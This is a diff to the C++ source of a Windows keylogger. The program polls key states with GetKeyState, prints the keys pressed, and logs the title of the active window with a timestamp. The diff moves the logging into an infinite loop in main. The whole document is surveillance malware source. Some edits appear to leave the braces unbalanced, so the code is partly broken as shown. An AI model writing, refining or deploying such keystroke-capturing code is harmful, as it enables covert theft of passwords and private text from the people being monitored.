@@ -1,16 +1,32 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
 #include <Windows.h>
 #include <string>
 #include <atlstr.h>
+#include <time.h>
 #include <chrono>
 #include <thread>
 using namespace std;
+char iss[200];
+HWND console = GetConsoleWindow();
+// Show the user change window
+void Window(void)
+{
+	this_thread::sleep_for(chrono::seconds(1));
+	time_t theTime = time(NULL);
+	struct tm* aTime = localtime(&theTime);
+	int day = aTime->tm_mday;
+	int month = aTime->tm_mon + 1;
+	int year = aTime->tm_year + 1900;
+	int hour = aTime->tm_hour;
+	int minute = aTime->tm_min;
+	int seconds = aTime->tm_sec;
 
-
-
+	HWND app = GetForegroundWindow();
+	GetWindowTextA(app, iss, 200);
+	cout << "[" << hour << ":" << minute << ":" << seconds << "]" << " " << iss << "\n";
+}
 void Keylogger(int delai) {
-	while (true) {
-
 		if (GetKeyState('A') & 0x8000) {
 
 			cout << "A";
@@ -269,21 +285,16 @@ void Keylogger(int delai) {
 			this_thread::sleep_for(chrono::milliseconds(delai));
 		}
 	}
-}
-
 
 
 int main()
 {
 	int limit = 200;
-	HWND console = GetConsoleWindow();
+
 
 	 ShowWindow(console, SW_SHOW);
-		 HWND app = GetForegroundWindow();
-		 char iss[200];
-		 GetWindowTextA(app,iss, 200);
-	// iss => to Show the name of the crurent active Window
 
+	
 	system("title Keylogger");
 	string path;
 	wstring newPath = L"";
@@ -326,6 +337,12 @@ int main()
 	}
 
 
+	while (true)
+	{
 
+		// Window();
 	Keylogger(100);
+		
+		
+	}
 }
